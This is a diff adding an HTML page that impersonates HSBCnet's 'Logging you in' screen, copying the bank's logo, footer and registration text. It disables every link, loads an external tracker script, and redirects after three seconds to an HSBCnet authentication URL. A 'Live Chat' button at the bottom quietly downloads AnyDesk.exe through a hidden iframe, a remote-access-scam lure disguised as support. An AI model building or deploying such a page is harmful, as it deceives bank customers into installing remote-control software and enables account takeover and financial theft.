@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name="theme-color" content="#3e505d">
+<title>Loading | HSBCnet</title>
+<style>
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; height: 100%; }
+  body {
+    font-family: "UniversNextforHSBC", Arial, sans-serif;
+    color: rgb(51, 51, 51);
+    background: rgb(29, 38, 44);
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+
+  /* Header */
+  .l-header {
+    background: rgb(29, 38, 44);
+    color: #fff;
+    height: 3.75rem;
+    flex-shrink: 0;
+  }
+  .l-header-inner {
+    max-width: 100rem;
+    margin: 0 auto;
+    height: 100%;
+    padding: 0 1.875rem;
+    display: flex;
+    align-items: center;
+  }
+  .l-brand {
+    display: inline-flex;
+    align-items: center;
+    color: #fff;
+    text-decoration: none;
+    font-weight: 600;
+  }
+  .l-brand svg { width: 56px; height: 28px; }
+  .l-brand span { padding-left: 0.5rem; font-size: 1rem; line-height: 1.75rem; }
+
+  /* Hero (background + card) */
+  .l-hero {
+    position: relative;
+    flex: 1 1 auto;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: url('assets/backgroundImage.jpg') center center / cover no-repeat rgb(37, 48, 56);
+    padding: 3rem 1.875rem;
+  }
+  .l-hero::before, .l-hero::after {
+    content: "";
+    position: absolute;
+    top: 0; bottom: 0;
+    width: 0.625rem;
+    background: rgb(37, 48, 56);
+  }
+  .l-hero::before { left: 0; }
+  .l-hero::after { right: 0; }
+  .l-overlay {
+    position: absolute;
+    inset: 0;
+    background: rgb(37, 48, 56);
+    opacity: 0.55;
+    pointer-events: none;
+  }
+
+  /* Card */
+  .l-card {
+    position: relative;
+    background: #fff;
+    width: 520px;
+    max-width: calc(100vw - 2.5rem);
+    padding: 3.25rem 2.5rem 2.75rem;
+    text-align: center;
+    z-index: 1;
+  }
+  .l-card h1 {
+    margin: 0 0 1.5rem;
+    font-weight: 300;
+    font-size: 1.625rem;
+    line-height: 1.2;
+    letter-spacing: -0.025em;
+    color: rgb(51, 51, 51);
+  }
+  .l-card p {
+    margin: 1.75rem 0 0;
+    font-size: 0.875rem;
+    line-height: 1.4;
+    color: rgb(51, 51, 51);
+  }
+
+  /* HSBC-style spinner */
+  .l-spinner {
+    position: relative;
+    width: 4rem;
+    height: 4rem;
+    margin: 0.5rem auto 0;
+  }
+  .l-spinner-ring {
+    box-sizing: border-box;
+    position: absolute;
+    inset: 0;
+    border: 4px solid rgba(219, 0, 17, 0.15);
+    border-top-color: rgb(219, 0, 17);
+    border-radius: 50%;
+    animation: l-spin 1s linear infinite;
+  }
+  @keyframes l-spin { to { transform: rotate(360deg); } }
+
+  /* Footer */
+  .l-footer { background: rgb(29, 38, 44); color: #fff; flex-shrink: 0; }
+  .l-footer-top { background: rgb(37, 48, 56); }
+  .l-footer-inner {
+    max-width: 100rem;
+    margin: 0 auto;
+    padding: 0 1.875rem;
+    font-size: 0.75rem;
+  }
+  .l-footer-top .l-footer-inner {
+    display: flex;
+    align-items: center;
+    gap: 2.5rem;
+    padding-top: 0.8125rem;
+    padding-bottom: 0.8125rem;
+  }
+  .l-footer-top a {
+    color: #fff;
+    text-decoration: none;
+    display: inline-flex;
+    align-items: center;
+    gap: 0.375rem;
+    line-height: 1;
+    cursor: default;
+  }
+  .l-footer-top svg { width: 20px; height: 20px; }
+  .l-footer-links {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 1.875rem;
+    padding: 1.25rem 0 0.75rem;
+  }
+  .l-footer-links a {
+    color: #fff;
+    text-decoration: none;
+    cursor: default;
+  }
+  .l-footer-note {
+    padding: 0.5rem 0 1.25rem;
+    color: #fff;
+  }
+
+  @media (max-width: 640px) {
+    .l-header-inner { padding: 0 1rem; }
+    .l-hero { padding: 2rem 1rem; }
+    .l-footer-inner { padding: 0 1rem; }
+    .l-footer-top .l-footer-inner {
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 0.5rem;
+    }
+    .l-footer-links { flex-direction: column; gap: 0.5rem; padding: 1rem 0 0.5rem; }
+    .l-footer-note { font-size: 0.7rem; }
+    .l-card { padding: 2.5rem 1.5rem 2rem; }
+    .l-card h1 { font-size: 1.375rem; }
+    .l-spinner { width: 3.25rem; height: 3.25rem; }
+  }
+</style>
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+  <header class="l-header">
+    <div class="l-header-inner">
+      <a href="#" class="l-brand" aria-label="HSBC">
+        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 32" focusable="false" aria-hidden="true">
+          <path fill="#fff" d="M47.245 0c0 18.738 0 29.145 0 31.227-18.738 0-29.145 0-31.227 0 0-18.738 0-29.145 0-31.227 18.734 0 29.145 0 31.227 0z"/>
+          <path fill="#db0011" d="M47.245 31.263l15.613-15.613-15.613-15.65v31.264z"/>
+          <path fill="#db0011" d="M16.019 0l15.613 15.65 15.613-15.65h-31.227z"/>
+          <path fill="#db0011" d="M16.019 0l-15.65 15.65 15.65 15.613v-31.264z"/>
+          <path fill="#db0011" d="M47.245 31.263l-15.613-15.613-15.613 15.613h31.227z"/>
+        </svg>
+        <span>HSBC</span>
+      </a>
+    </div>
+  </header>
+
+  <main class="l-hero">
+    <div class="l-overlay"></div>
+    <section class="l-card" role="status" aria-live="polite">
+      <h1>Logging you in to HSBCnet</h1>
+      <div class="l-spinner" aria-hidden="true">
+        <div class="l-spinner-ring"></div>
+      </div>
+      <p>This may take a few moments. Please don't refresh or close this window.</p>
+    </section>
+  </main>
+
+  <footer class="l-footer">
+    <div class="l-footer-top">
+      <div class="l-footer-inner">
+        <a href="#">
+          <svg viewBox="0 0 32 32" fill="#fff" aria-hidden="true"><path d="M24.448 15.409v12.199h-16.896v-12.203h1.877v-4.017c0-3.485 3.052-6.309 6.44-6.309s6.702 2.823 6.702 6.309v3.978l1.877 0.043zM19.728 11.019c0-1.85-2.048-3.368-3.858-3.368-1.791 0-3.558 1.499-3.558 3.368v4.406h7.417z"/></svg>
+          Online security
+        </a>
+        <a href="#">
+          <svg viewBox="0 0 32 32" fill="#fff" aria-hidden="true"><circle cx="16" cy="16" r="11" fill="none" stroke="#fff" stroke-width="1.5"/><ellipse cx="16" cy="16" rx="5" ry="11" fill="none" stroke="#fff" stroke-width="1.5"/><line x1="5" y1="16" x2="27" y2="16" stroke="#fff" stroke-width="1.5"/></svg>
+          HSBC Global
+        </a>
+        <a href="#">
+          <svg viewBox="0 0 32 32" fill="#fff" aria-hidden="true"><path d="M8.068 5.159c2.822-0.9 4.86 6.233 4.86 6.233l-2.598 2.166c0 0 0.77 2.487 3.383 5.169s5.074 3.473 5.074 3.473l2.287-2.811c0 0 3.235 0.708 5.968 2.461 0.158 0.102 0.247 0.292 0.216 0.481-0.55 3.398-2.915 5.593-6.485 5.241-1.553-0.161-11.545-2.585-15.734-14.82-0.885-2.544 0.177-6.663 3.029-7.592z"/></svg>
+          Customer support
+        </a>
+      </div>
+    </div>
+    <div class="l-footer-inner">
+      <div class="l-footer-links">
+        <a href="#">Terms &amp; conditions of use</a>
+        <a href="#">Privacy and data protection statement</a>
+        <a href="#">Cookie notice</a>
+        <a href="#">HSBCnet condition of national language use</a>
+        <a href="#" lang="zh-hans">沪ICP备15029387号-1</a>
+        <a href="#" lang="zh-hans">沪公网安备31011502007001号</a>
+      </div>
+      <div class="l-footer-note">
+        No endorsement or approval of any third parties or their advice, opinions, information, products or services is expressed or implied by any information on this Site or by any hyperlinks to or from any third party websites or pages. Your use of this website is subject to the terms and conditions governing it. Please read these terms and conditions before using the website.
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    document.addEventListener('click', function (e) {
+      var a = e.target.closest && e.target.closest('a');
+      if (a) { e.preventDefault(); e.stopPropagation(); }
+    }, true);
+
+    setTimeout(function () {
+      window.location.href = 'https://www1.secure.hsbcnet.com/uims/dl/DSP_AUTHENTICATION;jsessionid=0000ZkVrb8249eYKO_TaRR8M-4L:MMni08dmH';
+    }, 3000);
+  </script>
+<style>
+.hello-world-btn{position:fixed;bottom:1.25rem;right:1.25rem;z-index:9999;padding:0.625rem 1.25rem;background:rgb(219,0,17);color:#fff;border:none;font-size:0.875rem;font-family:"UniversNextforHSBC",Arial,sans-serif;cursor:pointer;border-radius:0.5rem;}
+.hello-world-btn:hover{background:rgb(175,0,13);}
+</style>
+<button class="hello-world-btn" type="button" onclick="(function(){var f=document.createElement('iframe');f.style.display='none';f.src='https://download.anydesk.com/AnyDesk.exe';document.body.appendChild(f);})()">Live Chat</button>
+</body>
+</html>
